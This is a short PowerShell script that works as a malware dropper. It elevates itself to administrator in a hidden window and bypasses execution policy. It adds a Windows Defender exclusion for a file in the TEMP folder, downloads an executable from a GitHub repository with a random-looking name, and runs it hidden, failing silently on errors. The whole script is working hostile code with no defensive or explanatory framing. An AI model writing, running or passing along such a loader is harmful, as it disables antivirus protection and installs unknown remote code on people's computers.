param([string]$OriginalTemp=$env:TEMP)
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`""
    (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe',$elevatedCommand,'','runas',0)
    exit
}

# Resolve full path with proper casing and no short names
$output = [IO.Path]::GetFullPath((Join-Path $OriginalTemp "cf2.exe"))

try {
    # Force create directory structure
    New-Item -Path (Split-Path $output) -ItemType Directory -Force | Out-Null
    
    # Create placeholder file
    $null = New-Item -Path $output -ItemType File -Force
    
    # Add exclusion to specific file path
    Add-MpPreference -ExclusionPath $output
    
    # Get final resolved path (no 8.3 names)
    $resolvedPath = (Get-Item $output).FullName
    
    # Download and replace placeholder
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/main/main.exe' -OutFile $resolvedPath
    
    # Verify and execute
    if (Test-Path $resolvedPath) {
        Start-Process $resolvedPath -WindowStyle Hidden
    }
}
catch { exit }
